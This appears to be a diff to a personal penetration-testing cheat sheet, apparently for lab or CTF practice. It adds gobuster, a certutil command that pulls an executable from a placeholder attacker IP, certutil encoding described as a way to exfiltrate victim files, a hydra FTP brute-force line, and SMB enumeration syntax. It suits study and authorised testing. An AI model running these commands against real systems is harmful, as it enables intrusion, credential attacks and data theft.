@@ -40,3 +40,46 @@ john --list=formats
 john hashes.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
 #windows local exploit suggester - from msfconsole/meterpreter
 run post/multi/recon/local_exploit_suggester
+
+### gobuster
+gobuster dir -u http://10.10.164.52:8080/ -w /usr/share/dirb/wordlists/common.txt
+#certutil
+
+##download from remote url
+
+certutil -urlcache -split -f http://<attacker-ip>/file.exe file.exe
+
+##Upload File from Victim to Attacker (via encoding)
+Command (Encode):
+
+certutil -encode C:\path\to\file.txt file.b64
+Purpose:
+Base64-encode a file to exfiltrate easily via terminal or script.
+
+Command (Decode):
+
+certutil -decode file.b64 file.txt
+certutil -hashfile file.exe MD5
+
+##ftp brute force
+"hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp"
+##smb enumeration
+
+enum4linux [options] ip"
+
+TAG            FUNCTION
+
+-U             get userlist
+-M             get machine list
+-N             get namelist dump (different from -U and-M)
+-S             get sharelist
+-P             get password policy information
+-G             get group and member list
+
+-a             all of the above (full basic enumeration)
+
+Syntax: smbclient //[IP]/[SHARE] -U [USERNAME] -p [PORT]
+
+Example: smbclient //10.10.10.10/secrets -U Anonymous -p 445
+
+
